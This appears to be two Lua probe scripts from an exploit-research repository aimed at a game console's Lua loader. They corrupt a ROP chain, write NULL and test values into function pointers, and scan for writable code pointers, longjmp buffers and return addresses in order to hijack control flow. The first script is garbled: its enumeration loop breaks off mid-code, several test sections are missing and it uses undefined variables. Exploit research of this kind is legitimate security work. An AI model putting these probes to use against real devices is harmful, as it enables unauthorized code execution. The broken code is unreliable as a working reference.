```lua
-- CRASH_CLASS: MODERATE (chain corruption test at end may crash process)
-- PROBE 46a: LOADER DISPATCH ANALYSIS
--
-- Context: Probe 45c proved make_syscall() copies bypass the ROP chain entirely.
-- But make_syscall() creates a PLAIN TABLE, while syscall.pipe is USERDATA.
-- The __call metamethod might dispatch differently for userdata vs table.
-- If the original userdata uses the chain, we can hijack it for code exec.
--
-- Tests (non-destructive first, destructive last):
-- A: Enumerate syscall.* namespace — find all available syscall objects
-- B: Metatable analysis — enumerate metamethods, get __call C function address
-- C: __call C function extraction — read CClosure struct to find real C function pointer
-- D: Pipe object deep dump — map the userdata structure at pipe address
-- E: Module cross-reference — which module owns __call?
-- F: Syscall object type comparison — userdata vs make_syscall table
-- G: Return address manipulation — does changing return_addr redirect flow?
-- H: GOT/PLT scan — look for writable function pointers near __call
-- I: DISPATCH PATH TEST (DESTRUCTIVE) — corrupt chain, test userdata vs table call

print("=== PROBE 46a: LOADER DISPATCH ANALYSIS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end

local pid = to_num(make_syscall(20)())

local ok_enum, err_enum = pcall(function()
    for k, v in pairs(syscall) do

        local vstr = ""

end)
if not ok_enum then print("  enumeration error: " .. tostring(err_enum)) end
print("  total keys: " .. #syscall_keys)

-- Also check syscall metatable

-- Check resolve function

-- Cross-reference key addresses with modules
local function find_module(addr_val)
    if addr_val == nil then return nil end
    local ah, al = get_hi_lo(addr_val)
    for _, m in ipairs(modules) do
        -- Check text section
        local tb_h, tb_l = m.text_hi, m.text_lo
        local te_h = m.text_hi + m.text_sz_hi
        local te_l = m.text_lo + m.text_sz_lo
        if te_l >= 0x100000000 then te_h = te_h + 1; te_l = te_l - 0x100000000 end
        if (ah > tb_h or (ah == tb_h and al >= tb_l)) and
           (ah < te_h or (ah == te_h and al < te_l)) then
            return m.handle, "text", al - tb_l
        end
        -- Check data section
        if m.data_base then
            local db_h, db_l = m.data_hi, m.data_lo
            local de_h = db_h + m.data_sz_hi
            local de_l = db_l + m.data_sz_lo
            if de_l >= 0x100000000 then de_h = de_h + 1; de_l = de_l - 0x100000000 end
            if (ah > db_h or (ah == db_h and al >= db_l)) and
               (ah < de_h or (ah == de_h and al < de_l)) then
                return m.handle, "data", al - db_l
            end
        end
    end
    return nil
end

    local fn_ptr = uint64(fn_addr_str)
    print("  fcall_stub base: " .. fn_addr_str)

    -- Read current values
    local orig_fn = safe_rq(fn_ptr)
    local orig_pivot = safe_rq(fn_ptr + 8)
    local orig_ret = safe_rq(fn_ptr + 16)
    local orig_flags = safe_rq(fn_ptr + 24)

    print("  +00 fn_addr:    " .. fmt_addr(orig_fn))
    print("  +08 pivot:      " .. fmt_addr(orig_pivot))
    print("  +16 return_addr:" .. fmt_addr(orig_ret))
    print("  +24 flags:      " .. fmt_addr(orig_flags))

    -- Check if return_addr is writable
    local test_val = safe_rq(fn_ptr + 16)
    if test_val then
        -- Save original
        local saved_ret = test_val

        -- Write a known value to return_addr
        local wrote_ok = safe_wq(fn_ptr + 16, uint64("0xDEADBEEFCAFE0000"))
        local readback = safe_rq(fn_ptr + 16)
        print("  return_addr writable: " .. tostring(wrote_ok))
        print("  readback: " .. fmt_addr(readback))

        -- Restore immediately
        safe_wq(fn_ptr + 16, saved_ret)
        print("  restored return_addr: " .. fmt_addr(safe_rq(fn_ptr + 16)))

        -- Now test: does changing return_addr affect make_syscall behavior?
        -- Save, modify, call getpid, check result, restore
        local saved = safe_rq(fn_ptr + 16)

        -- Try pointing return_addr to a ret gadget (should be a no-op if used)
        -- Use the known ret gadget from ropchain: 0x08CF4042
        local ret_gadget = uint64("0x08CF4042")
        safe_wq(fn_ptr + 16, ret_gadget)

        local ok_r, ret_r = pcall(function() return make_syscall(20)() end)
        print("  getpid with return_addr=ret_gadget: ok=" .. tostring(ok_r) ..
              " ret=" .. tostring(to_num(ret_r)))

        -- Restore
        safe_wq(fn_ptr + 16, saved)
        local ok_r2, ret_r2 = pcall(function() return make_syscall(20)() end)
        print("  getpid after restore: ok=" .. tostring(ok_r2) ..
              " ret=" .. tostring(to_num(ret_r2)))
    end
else
    print("  *** fn_addr_str not parsed ***")
end
print("")

print("=== H: GOT/PLT SCAN ===")
-- If we identified which module __call is in, scan its data section
-- for function pointer patterns (sequential pointers into .text = GOT)
if #modules > 0 then
    -- Eboot is module 0 — scan its data section for GOT-like entries
    local eboot = modules[1]
    if eboot.data_base then
        print("  Eboot data section: " .. fmt_addr(eboot.data_base) ..
              " size: " .. string.format("%08X_%08X", eboot.data_sz_hi, eboot.data_sz_lo))

        -- Scan first 4KB of data section for pointers into text
        local got_entries = {}
        local scan_limit = math.min(4096, to_num(eboot.data_size) or 4096)
        local tb_h, tb_l = eboot.text_hi, eboot.text_lo

        for off = 0, scan_limit - 8, 8 do
            local val = safe_rq(eboot.data_base + off)
            if val then
                local vh, vl = get_hi_lo(val)
                -- Check if it points into eboot text
                if vh == tb_h and vl >= tb_l and
                   vl < tb_l + (eboot.text_sz_lo or 0) then
                    table.insert(got_entries, {offset = off, value = val})
                    if #got_entries <= 20 then
                        print(string.format("    data+0x%04X: %s (text+0x%X)",
                            off, fmt_addr(val), vl - tb_l))
                    end
                end
            end
        end
        print("  GOT-like entries in first 4KB: " .. #got_entries)

        if #got_entries > 20 then
            print("  (showing first 20)")
        end

        -- Now check: are any of these writable?
        if #got_entries > 0 then
            local first = got_entries[1]
            local saved = safe_rq(eboot.data_base + first.offset)
            local wrote = safe_wq(eboot.data_base + first.offset, uint64("0x4141414141414141"))
            local rb = safe_rq(eboot.data_base + first.offset)
            local is_writable = (fmt_addr(rb) == "00000000_41414141" or
                                 fmt_addr(rb) == "41414141_41414141")
            safe_wq(eboot.data_base + first.offset, saved)
            print("  data section writable: " .. tostring(is_writable or wrote))
        end
    else
        print("  eboot data section not found in dynlib_get_info")
    end

    -- Also check libkernel (usually module 1) data section
    if #modules >= 2 then
        local lk = modules[2]
        if lk.data_base then
            print("")
            print("  Module 1 data section: " .. fmt_addr(lk.data_base) ..
                  " size: " .. string.format("%08X_%08X", lk.data_sz_hi, lk.data_sz_lo))

            local lk_got = {}
            local lk_limit = math.min(4096, to_num(lk.data_size) or 4096)
            for off = 0, lk_limit - 8, 8 do
                local val = safe_rq(lk.data_base + off)
                if val then
                    local vh, vl = get_hi_lo(val)
                    if vh == lk.text_hi and vl >= lk.text_lo and
                       vl < lk.text_lo + (lk.text_sz_lo or 0) then
                        table.insert(lk_got, {offset = off, value = val})
                        if #lk_got <= 10 then
                            print(string.format("    data+0x%04X: %s", off, fmt_addr(val)))
                        end
                    end
                end
            end
            print("  Module 1 GOT-like entries in first 4KB: " .. #lk_got)
        end
    end
else
    print("  no modules loaded")
end
print("")

print("=== I: DISPATCH PATH TEST (DESTRUCTIVE) ===")
print("*** This test corrupts the ROP chain to determine if ***")
print("*** the original userdata uses it vs make_syscall copies ***")
print("")

if rop_addr_str then
    local rop_base = uint64(rop_addr_str)

    -- Baseline: both should work with intact chain
    local ok_baseline_ms, ret_baseline_ms = pcall(function() return make_syscall(20)() end)
    local ok_baseline_pipe, ret_baseline_pipe = pcall(function() return syscall.pipe() end)
    print("  Baseline (intact chain):")
    print("    make_syscall(20): ok=" .. tostring(ok_baseline_ms) ..
          " ret=" .. tostring(to_num(ret_baseline_ms)))
    print("    syscall.pipe():   ok=" .. tostring(ok_baseline_pipe) ..
          " ret=" .. tostring(ret_baseline_pipe))

    -- Save first 64 bytes of chain
    local saved_chain = {}
    for i = 0, 56, 8 do
        saved_chain[i] = safe_rq(rop_base + i)
    end
    print("  saved chain[0..56]")

    -- CORRUPT the chain
    for i = 0, 56, 8 do
        safe_wq(rop_base + i, uint64("0x4141414141414141"))
    end
    print("  corrupted chain[0..56] with 0x41414141_41414141")

    -- Test 1: make_syscall copy (should still work — confirmed by 45c)
    local ok_ms, ret_ms = pcall(function() return make_syscall(20)() end)
    print("")
    print("  With corrupted chain:")
    print("    make_syscall(20): ok=" .. tostring(ok_ms) .. " ret=" .. tostring(to_num(ret_ms)))

    -- Test 2: original syscall.pipe (THE KEY TEST)
    -- If this crashes, the original userdata USES the chain!
    print("    calling syscall.pipe() with corrupted chain...")
    local ok_pipe, ret_pipe = pcall(function() return syscall.pipe() end)
    print("    syscall.pipe():   ok=" .. tostring(ok_pipe) .. " ret=" .. tostring(ret_pipe))

    if ok_pipe then
        print("  *** BOTH SURVIVED — neither path uses the ROP chain ***")
        print("  *** The C wrapper handles all dispatch ***")
    else
        print("  *** syscall.pipe() FAILED/CRASHED with corrupted chain! ***")
        print("  *** The original userdata DOES use the ROP chain! ***")
        print("  *** This means we CAN hijack execution via chain manipulation! ***")
    end

    -- Restore chain
    for i = 0, 56, 8 do
        if saved_chain[i] then
            safe_wq(rop_base + i, saved_chain[i])
        end
    end
    print("  chain restored")

    -- Verify restoration
    local ok_verify, ret_verify = pcall(function() return make_syscall(20)() end)
    print("  verify after restore: ok=" .. tostring(ok_verify) ..
          " ret=" .. tostring(to_num(ret_verify)))

    -- Also test: corrupt fn_addr itself and call syscall.pipe
    if fn_addr_str then
        print("")
        print("  fn_addr corruption test:")
        local fn_ptr = uint64(fn_addr_str)
        local saved_fn = safe_rq(fn_ptr)
        print("    saved fn_addr: " .. fmt_addr(saved_fn))

        -- Write a NOP (0x0) to fn_addr
        safe_wq(fn_ptr, uint64("0x0"))
        print("    fn_addr set to NULL")

        local ok_fn_ms, ret_fn_ms = pcall(function() return make_syscall(20)() end)
        print("    make_syscall(20): ok=" .. tostring(ok_fn_ms) ..
              " ret=" .. tostring(to_num(ret_fn_ms)))

        local ok_fn_pipe, ret_fn_pipe = pcall(function() return syscall.pipe() end)
        print("    syscall.pipe():   ok=" .. tostring(ok_fn_pipe) ..
              " ret=" .. tostring(ret_fn_pipe))

        -- Restore fn_addr
        safe_wq(fn_ptr, saved_fn)
        print("    fn_addr restored: " .. fmt_addr(safe_rq(fn_ptr)))

        if ok_fn_pipe and ok_fn_ms then
            print("  *** BOTH survived NULL fn_addr ***")
        elseif not ok_fn_pipe and ok_fn_ms then
            print("  *** syscall.pipe CRASHED with NULL fn_addr! ***")
            print("  *** fn_addr IS used by original userdata path! ***")
        end
    end
else
    print("  *** could not parse ropchain address ***")
end
print("")

print("=== PROBE 46a COMPLETE ===")
```

## probes/phase10_untested_theories/52a_loader_internals.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 52a: Loader Internals — Native Code Dispatch & Writable Code Pointers
--
-- Context: Probe 45c proved make_syscall() bypasses the ROP chain via a C wrapper.
-- Probe 47b found CClosure+0 is a "C function candidate" but NEVER TESTED if +0
-- is writable. The module-matching was buggy (heap addrs 0x3_1XXX matched as
-- mod0.text). This probe:
--   A) Maps all dynlib data sections (RW) for function pointer scanning
--   B) Properly tests CClosure +0 writability (the actual GCObject.next pointer)
--   C) Finds the REAL C function that implements __call dispatch
--   D) Scans eboot .data/.bss for writable pointers into .text (vtables, callbacks)
--   E) Scans the Lua state and registry for writable code pointers
--   F) Looks for the C-level syscall dispatch table in the loader

print("=== PROBE 52a: LOADER INTERNALS ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(v)
    local h, l = get_hi_lo(v)
    return string.format("%08X_%08X", h, l)
end
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)") or s:match(":%s*([0-9a-fA-F][0-9a-fA-F]+)%s*$")
    if hex then return uint64("0x" .. hex), hex end
    return nil, nil
end

local sc_getpid = make_syscall(20)
local sc_info = make_syscall(593)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) MAP ALL MODULE SECTIONS (text=RX/XO, data=RW)
--------------------------------------------------------------------
print("")
print("=== A: MODULE MAP ===")
local modules = {}
for handle = 0, 50 do
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local ok, rv = pcall(function() return sc_info(uint64(handle), uint64(info)) end)
    if ok and to_num(rv) == 0 then
        local text_lo = safe_rd(info + 0x108) or 0
        local text_hi = safe_rd(info + 0x10C) or 0
        local text_sz_lo = safe_rd(info + 0x110) or 0
        local text_sz_hi = safe_rd(info + 0x114) or 0
        local data_lo = safe_rd(info + 0x148) or 0
        local data_hi = safe_rd(info + 0x14C) or 0
        local data_sz_lo = safe_rd(info + 0x150) or 0
        local data_sz_hi = safe_rd(info + 0x154) or 0
        -- Read module name (1 byte at a time from offset 0x18)
        local name = ""
        for i = 0, 31 do
            local b = safe_rd(info + 0x18 + i)
            if b and b > 0 and b < 128 then name = name .. string.char(b)
            else break end
        end
        if text_hi > 0 or text_lo > 0 then
            local m = {
                handle = handle, name = name,
                text_hi = text_hi, text_lo = text_lo,
                text_sz = text_sz_lo, text_sz_hi = text_sz_hi,
                data_hi = data_hi, data_lo = data_lo,
                data_sz = data_sz_lo, data_sz_hi = data_sz_hi,
            }
            table.insert(modules, m)
            print(string.format("  [%2d] %-20s text=%08X_%08X+%08X  data=%08X_%08X+%08X",
                handle, name, text_hi, text_lo, text_sz_lo, data_hi, data_lo, data_sz_lo))
        end
    end
end
print("  Total modules: " .. #modules)

-- Proper module lookup
local function in_text(h, l)
    for _, m in ipairs(modules) do
        if h == m.text_hi and l >= m.text_lo and l < (m.text_lo + m.text_sz) then
            return m, l - m.text_lo
        end
    end
    return nil
end
local function in_data(h, l)
    for _, m in ipairs(modules) do
        if m.data_sz > 0 and h == m.data_hi and l >= m.data_lo and l < (m.data_lo + m.data_sz) then
            return m, l - m.data_lo
        end
    end
    return nil
end

--------------------------------------------------------------------
-- B) CCLOSURE +0 WRITE TEST (never tested in 47b!)
--------------------------------------------------------------------
print("")
print("=== B: CCLOSURE +0 WRITE TEST ===")
local mt = getmetatable(syscall.pipe)
local call_fn = mt.__call
local fn_obj, fn_hex = parse_func_addr(call_fn)
if not fn_obj then
    print("FATAL: cannot parse __call address")
else
    print("__call CClosure at: 0x" .. fn_hex)
    -- Dump first 8 qwords
    for off = 0, 56, 8 do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            local note = ""
            local m_t, moff_t = in_text(h, l)
            local m_d, moff_d = in_data(h, l)
            if m_t then note = string.format(" [%s.text+0x%X]", m_t.name, moff_t) end
            if m_d then note = string.format(" [%s.data+0x%X]", m_d.name, moff_d) end
            print(string.format("  +%02d: %s%s", off, fmt(val), note))
        end
    end

    -- Now test writability of EVERY offset 0..56
    print("")
    print("  Writability test (all offsets 0..56):")
    local probe_val = uint64("0xDEADC0DEDEADC0DE")
    for off = 0, 56, 8 do
        local saved = safe_rq(fn_obj + off)
        if saved then
            local wrote = safe_wq(fn_obj + off, probe_val)
            local rb = safe_rq(fn_obj + off)
            safe_wq(fn_obj + off, saved) -- restore immediately
            local rb_h, rb_l = get_hi_lo(rb)
            local writable = (rb_h == 0xDEADC0DE and rb_l == 0xDEADC0DE)
            local tag = writable and "WRITABLE" or "read-only"
            print(string.format("    +%02d: %s (%s)", off, tag, fmt(saved)))
        else
            print(string.format("    +%02d: unreadable", off))
        end
    end
end

--------------------------------------------------------------------
-- C) FIND THE REAL C DISPATCH FUNCTION
-- The CClosure f pointer (Lua 5.1 layout: offset +32 on x64) points
-- to the C function. But 47b showed +32 = heap addr. Either:
--   1) The struct layout is different (non-standard Lua)
--   2) The C function IS at a heap addr (JIT or loader-generated)
-- Let's read bytes at each qword that looks like a code pointer.
--------------------------------------------------------------------
print("")
print("=== C: C FUNCTION DISPATCH SEARCH ===")
if fn_obj then
    -- Read every qword in CClosure and try to read code bytes
    for off = 0, 56, 8 do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            -- Skip nullish and obvious data values
            if h == 0 and l == 0 then
                -- skip
            elseif h == 0 and l < 0x10000 then
                -- skip small values (flags, tags)
            else
                -- Try reading 16 bytes as code
                local bytes = {}
                local readable = true
                for i = 0, 15 do
                    local ok_b, b = pcall(function()
                        return memory.read_byte(val + i)
                    end)
                    if ok_b then
                        bytes[#bytes+1] = string.format("%02x", to_num(b))
                    else
                        readable = false
                        break
                    end
                end
                if readable and #bytes == 16 then
                    local hex_str = table.concat(bytes, " ")
                    -- Check for x86-64 function prologue patterns
                    local is_push_rbp = (bytes[1] == "55") -- push rbp
                    local is_sub_rsp = (bytes[1] == "48" and bytes[2] == "83" and bytes[3] == "ec") -- sub rsp, imm8
                    local is_mov_rbp = (bytes[1] == "48" and bytes[2] == "89" and bytes[3] == "e5") -- mov rbp, rsp
                    local is_push = bytes[1]:match("5[0-7]") -- push r64
                    local is_endbr64 = (bytes[1] == "f3" and bytes[2] == "0f" and bytes[3] == "1e" and bytes[4] == "fa")
                    local tag = ""
                    if is_push_rbp then tag = " *** FUNCTION PROLOGUE (push rbp) ***" end
                    if is_sub_rsp then tag = " *** FUNCTION PROLOGUE (sub rsp) ***" end
                    if is_endbr64 then tag = " *** FUNCTION PROLOGUE (endbr64) ***" end
                    if is_mov_rbp then tag = " *** FUNCTION PROLOGUE (mov rbp,rsp) ***" end
                    print(string.format("  +%02d → %s: %s%s", off, fmt(val), hex_str, tag))
                else
                    -- Could be XO or unmapped
                    local partial = #bytes > 0 and table.concat(bytes, " ") or "unreadable"
                    print(string.format("  +%02d → %s: [%d bytes] %s", off, fmt(val), #bytes, partial))
                end
            end
        end
    end

    -- Also check: does the CClosure point to ANOTHER struct that has the C func?
    -- In some Lua implementations, CClosure+32 → upvalue which → C func
    print("")
    print("  Dereferencing pointers for indirect dispatch:")
    for off = 0, 48, 8 do
        local ptr = safe_rq(fn_obj + off)
        if ptr then
            local ph, pl = get_hi_lo(ptr)
            -- Only follow heap-range pointers
            if ph >= 1 and ph <= 0x10 then
                -- Read 8 bytes at *ptr
                local inner = safe_rq(ptr)
                if inner then
                    local ih, il = get_hi_lo(inner)
                    local m_t, moff = in_text(ih, il)
                    if m_t then
                        print(string.format("    +%02d → *(%s) = %s [%s.text+0x%X] *** CODE PTR ***",
                            off, fmt(ptr), fmt(inner), m_t.name, moff))
                        -- Try reading code bytes
                        local cbytes = {}
                        for i = 0, 7 do
                            local ok_b, b = pcall(function() return memory.read_byte(inner + i) end)
                            if ok_b then cbytes[#cbytes+1] = string.format("%02x", to_num(b))
                            else break end
                        end
                        if #cbytes > 0 then
                            print(string.format("      code: %s", table.concat(cbytes, " ")))
                        end
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- D) EBOOT DATA SECTION SCAN FOR WRITABLE FUNCTION POINTERS
-- The eboot (handle 0) has data sections that may contain vtables,
-- callback arrays, or dispatch tables with pointers into .text.
--------------------------------------------------------------------
print("")
print("=== D: EBOOT DATA SECTION SCAN ===")
local eboot = modules[1] -- handle 0 is usually first
if eboot and eboot.data_sz > 0 then
    local data_base = uint64(string.format("0x%X%08X", eboot.data_hi, eboot.data_lo))
    local scan_size = eboot.data_sz
    if scan_size > 0x40000 then scan_size = 0x40000 end -- cap at 256KB
    print(string.format("  Scanning %s data at %s, size 0x%X (capped at 0x%X)",
        eboot.name, fmt(data_base), eboot.data_sz, scan_size))

    local found_ptrs = 0
    local writable_ptrs = 0
    local MAX_REPORT = 30

    for off = 0, scan_size - 8, 8 do
        local val = safe_rq(data_base + off)
        if val then
            local h, l = get_hi_lo(val)
            local m_t, moff = in_text(h, l)
            if m_t and m_t.handle == 0 then -- eboot .text pointer
                found_ptrs = found_ptrs + 1
                if found_ptrs <= MAX_REPORT then
                    -- Test writability
                    local saved = val
                    local wrote = safe_wq(data_base + off, probe_val)
                    local rb = safe_rq(data_base + off)
                    safe_wq(data_base + off, saved)
                    local rb_h = get_hi_lo(rb)
                    local writable = (rb_h == 0xDEADC0DE)
                    if writable then writable_ptrs = writable_ptrs + 1 end
                    local tag = writable and " *** WRITABLE ***" or ""
                    print(string.format("    data+0x%05X: %s → .text+0x%X%s",
                        off, fmt(val), moff, tag))
                end
            end
        end
        -- Yield periodically to avoid timeout
        if off % 0x10000 == 0 and off > 0 then
            print(string.format("    ... scanned 0x%X / 0x%X (%d ptrs found, %d writable)",
                off, scan_size, found_ptrs, writable_ptrs))
        end
    end
    print(string.format("  TOTAL: %d code pointers in eboot data, %d WRITABLE",
        found_ptrs, writable_ptrs))
else
    print("  No eboot data section found or size=0")
    -- Try all modules
    for _, m in ipairs(modules) do
        if m.data_sz > 0 then
            print(string.format("  [%d] %s has data section: %08X_%08X+0x%X",
                m.handle, m.name, m.data_hi, m.data_lo, m.data_sz))
        end
    end
end

--------------------------------------------------------------------
-- E) SCAN AROUND pipe OBJECT FOR DISPATCH TABLE
-- The make_syscall C wrapper must have a dispatch path. Look in the
-- neighborhood of the pipe object for function pointers.
--------------------------------------------------------------------
print("")
print("=== E: PIPE OBJECT NEIGHBORHOOD ===")
local pipe_str = tostring(syscall.pipe)
local pipe_addr_hex = pipe_str:match("address @ (0x[0-9a-fA-F]+)")
local fn_addr_str = pipe_str:match("fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

if pipe_addr_hex then
    local pipe_addr = uint64(pipe_addr_hex)
    print("pipe object: " .. pipe_addr_hex)

    -- Scan the pipe object's wider neighborhood (-256 to +512)
    -- looking for code pointers that might be the dispatch function
    local code_ptrs_found = 0
    for off = -256, 512, 8 do
        local val = safe_rq(pipe_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            local m_t, moff = in_text(h, l)
            if m_t then
                code_ptrs_found = code_ptrs_found + 1
                if code_ptrs_found <= 20 then
                    -- Check if writable
                    local saved = val
                    safe_wq(pipe_addr + off, uint64("0xDEADC0DEDEADC0DE"))
                    local rb = safe_rq(pipe_addr + off)
                    safe_wq(pipe_addr + off, saved)
                    local rb_h = get_hi_lo(rb)
                    local writable = (rb_h == 0xDEADC0DE)
                    local tag = writable and " WRITABLE" or ""
                    print(string.format("  pipe%+04d: %s [%s.text+0x%X]%s",
                        off, fmt(val), m_t.name, moff, tag))
                end
            end
        end
    end
    print(string.format("  Code pointers near pipe: %d", code_ptrs_found))
end

--------------------------------------------------------------------
-- F) SCAN fn_addr STRUCTURE FOR THE REAL C WRAPPER
-- The fn_addr area has a structure around it. Look for the actual
-- dispatch function address.
--------------------------------------------------------------------
print("")
print("=== F: FN_ADDR STRUCTURE ===")
if fn_addr_str then
    local fn_addr = uint64(fn_addr_str)
    print("fn_addr ptr: " .. fn_addr_str)
    local fn_val = safe_rq(fn_addr)
    print("fn_addr value: " .. (fn_val and fmt(fn_val) or "nil"))

    -- Scan wider area around fn_addr for the dispatch mechanism
    -- The C wrapper must be somewhere nearby
    print("")
    print("  Wider neighborhood (-128 to +256):")
    for off = -128, 256, 8 do
        local val = safe_rq(fn_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            local m_t, moff = in_text(h, l)
            if m_t then
                -- Check writability
                local saved = val
                safe_wq(fn_addr + off, uint64("0xDEADC0DEDEADC0DE"))
                local rb = safe_rq(fn_addr + off)
                safe_wq(fn_addr + off, saved)
                local rb_h = get_hi_lo(rb)
                local writable = (rb_h == 0xDEADC0DE)
                local tag = writable and " WRITABLE" or ""
                print(string.format("    fn%+04d: %s [%s.text+0x%X]%s",
                    off, fmt(val), m_t.name, moff, tag))
            end
        end
    end
end

--------------------------------------------------------------------
-- G) METATABLE FUNCTIONS: TEST +0 WRITABILITY ON ALL
-- 47b only tested +32. The actual C function pointer in this
-- custom Lua may be at a different offset. Test +0 on all.
--------------------------------------------------------------------
print("")
print("=== G: ALL METATABLE CCLOSURES +0 WRITE TEST ===")
local mt_keys = {"__call", "__tostring", "__index", "__newindex", "__gc",
                 "arg_addr", "chain", "create_initial_chain", "new",
                 "__len", "__eq", "__add", "__sub", "__mul", "__div"}
for _, key in ipairs(mt_keys) do
    local ok_v, val = pcall(function() return mt[key] end)
    if ok_v and val ~= nil and type(val) == "function" then
        local fobj, fhex = parse_func_addr(val)
        if fobj then
            local val0 = safe_rq(fobj)
            if val0 then
                local saved = val0
                safe_wq(fobj, uint64("0xDEADC0DEDEADC0DE"))
                local rb = safe_rq(fobj)
                safe_wq(fobj, saved)
                local rb_h = get_hi_lo(rb)
                local writable = (rb_h == 0xDEADC0DE)
                local tag = writable and " *** +0 WRITABLE ***" or ""
                print(string.format("  mt.%-20s obj=0x%s +0=%s%s", key, fhex, fmt(val0), tag))
            end
        end
    end
end

--------------------------------------------------------------------
-- H) GLOBAL FUNCTION TABLE SCAN
-- Scan _G for all C functions and test their CClosure +0 writability
--------------------------------------------------------------------
print("")
print("=== H: GLOBAL C FUNCTION SCAN (sample) ===")
local g_count = 0
local g_writable = 0
for key, val in pairs(_G) do
    if type(val) == "function" then
        local fobj, fhex = parse_func_addr(val)
        if fobj then
            local val0 = safe_rq(fobj)
            if val0 then
                local saved = val0
                safe_wq(fobj, uint64("0xDEADC0DEDEADC0DE"))
                local rb = safe_rq(fobj)
                safe_wq(fobj, saved)
                local rb_h = get_hi_lo(rb)
                local writable = (rb_h == 0xDEADC0DE)
                g_count = g_count + 1
                if writable then
                    g_writable = g_writable + 1
                    if g_writable <= 10 then
                        print(string.format("  %-20s obj=0x%s +0=%s WRITABLE", key, fhex, fmt(val0)))
                    end
                end
            end
        end
    end
    -- Also scan tables (like string, math, etc)
    if type(val) == "table" and key ~= "_G" then
        for k2, v2 in pairs(val) do
            if type(v2) == "function" then
                local fobj, fhex = parse_func_addr(v2)
                if fobj then
                    local val0 = safe_rq(fobj)
                    if val0 then
                        local saved = val0
                        safe_wq(fobj, uint64("0xDEADC0DEDEADC0DE"))
                        local rb = safe_rq(fobj)
                        safe_wq(fobj, saved)
                        local rb_h = get_hi_lo(rb)
                        local writable = (rb_h == 0xDEADC0DE)
                        g_count = g_count + 1
                        if writable then
                            g_writable = g_writable + 1
                            if g_writable <= 10 then
                                print(string.format("  %s.%-15s obj=0x%s +0=%s WRITABLE",
                                    key, k2, fhex, fmt(val0)))
                            end
                        end
                    end
                end
            end
        end
    end
end
print(string.format("  Scanned %d C functions, %d with writable +0", g_count, g_writable))

--------------------------------------------------------------------
-- I) LONGJMP BUFFER SCAN
-- The ROP chain uses longjmp. If we can find the jmpbuf on the heap,
-- we can redirect control flow via setjmp/longjmp hijack.
--------------------------------------------------------------------
print("")
print("=== I: LONGJMP / RETURN PATH ===")
if rop_str then
    local rop_addr = uint64(rop_str)
    -- From 47b, the chain ends with longjmp gadget. Scan for jmpbuf addr.
    -- Pattern: pop rdi; <jmpbuf_addr>; ... ; call longjmp
    -- The chain at offset 0x2E0+ has the longjmp sequence
    for off = 0x260, 0x3E0, 8 do
        local val = safe_rq(rop_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            -- Look for heap addresses that could be jmpbuf
            if h >= 1 and h <= 0x10 then
                -- Check if this heap addr contains something that looks like a saved RIP
                local inner = safe_rq(val)
                if inner then
                    local ih, il = get_hi_lo(inner)
                    local m_t, moff = in_text(ih, il)
                    local note = m_t and string.format(" [%s.text+0x%X]", m_t.name, moff) or ""
                    print(string.format("  chain+0x%03X: %s → *=%s%s",
                        off, fmt(val), fmt(inner), note))
                end
            end
        end
    end

    -- The return_addr slot
    local ret_addr_str = pipe_str:match("return_addr: (0x[0-9a-fA-F]+)")
    if ret_addr_str then
        local ret_addr = uint64(ret_addr_str)
        local ret_val = safe_rq(ret_addr)
        print("")
        print("  return_addr ptr: " .. ret_addr_str)
        print("  return_addr value: " .. (ret_val and fmt(ret_val) or "nil"))
        if ret_val then
            local rh, rl = get_hi_lo(ret_val)
            local m_t, moff = in_text(rh, rl)
            if m_t then
                print(string.format("  → [%s.text+0x%X]", m_t.name, moff))
            end
            -- Test writability
            local saved = ret_val
            safe_wq(ret_addr, uint64("0xDEADC0DEDEADC0DE"))
            local rb = safe_rq(ret_addr)
            safe_wq(ret_addr, saved)
            local rb_h = get_hi_lo(rb)
            local writable = (rb_h == 0xDEADC0DE)
            print("  return_addr writable: " .. tostring(writable))
            if writable then
                print("  *** return_addr IS WRITABLE — potential control flow hijack ***")
            end
        end
    end
end

--------------------------------------------------------------------
-- J) SUMMARY
--------------------------------------------------------------------
print("")
